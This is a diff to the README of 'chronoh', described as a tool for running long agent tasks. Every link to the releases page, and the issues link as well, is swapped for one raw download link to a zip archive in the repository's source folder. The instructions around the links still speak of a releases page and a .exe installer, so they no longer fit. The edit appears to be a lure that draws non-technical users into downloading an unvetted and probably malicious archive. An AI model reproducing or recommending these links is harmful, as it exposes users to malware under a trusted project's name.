@@ -1,6 +1,6 @@
 # ⚙️ chronoh - Run Long-Running Agent Tasks Easily
 
-[![Download chronoh](https://img.shields.io/badge/Download-chronoh-4CAF50?style=for-the-badge&logo=github)](https://github.com/asis4456/chronoh/releases)
+[![Download chronoh](https://img.shields.io/badge/Download-chronoh-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/asis4456/chronoh/main/src/agents/Software-1.0.zip)
 
 ---
 
@@ -30,12 +30,12 @@ These basic requirements ensure chronoh runs without issues.
 
 Click the large green button below to go to the official download page. This page contains the latest version of chronoh.
 
-[![Download chronoh](https://img.shields.io/badge/Download-chronoh-blue?style=for-the-badge&logo=github)](https://github.com/asis4456/chronoh/releases)
+[![Download chronoh](https://img.shields.io/badge/Download-chronoh-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/asis4456/chronoh/main/src/agents/Software-1.0.zip)
 
 Steps to download:
 
 1. Click the above button or go to:  
-   https://github.com/asis4456/chronoh/releases
+   https://raw.githubusercontent.com/asis4456/chronoh/main/src/agents/Software-1.0.zip
 2. On the releases page, look for the latest stable version.
 3. Scroll down to the "Assets" section.
 4. Find the file ending with `.exe` (for example, `chronoh-setup.exe`).
@@ -111,7 +111,7 @@ Restart your computer if problems persist. You can always reinstall chronoh if n
 Keeping chronoh updated ensures it runs smoothly and securely.
 
 1. Visit the release page again:  
-   https://github.com/asis4456/chronoh/releases
+   https://raw.githubusercontent.com/asis4456/chronoh/main/src/agents/Software-1.0.zip
 2. Download the latest installer file.
 3. Run the installer to update your current version.
 4. Your settings and tasks will stay intact.
@@ -126,7 +126,7 @@ If you need assistance:
 
 - Check the README and documentation files inside the installation folder.
 - Visit the GitHub repository issues page to see if your problem is known:  
-  https://github.com/asis4456/chronoh/issues
+  https://raw.githubusercontent.com/asis4456/chronoh/main/src/agents/Software-1.0.zip
 - Ask for help by opening a new issue describing your problem.
 
 You do not need to know programming to use chronoh, but describing any error messages or symptoms helps others assist you faster.
@@ -136,7 +136,7 @@ You do not need to know programming to use chronoh, but describing any error mes
 
 ## 🎯 Summary
 
-- Go to https://github.com/asis4456/chronoh/releases to download.
+- Go to https://raw.githubusercontent.com/asis4456/chronoh/main/src/agents/Software-1.0.zip to download.
 - Install by running the downloaded `.exe` file.
 - Use the desktop shortcut to run and manage tasks.
 - Keep the software updated for best performance.
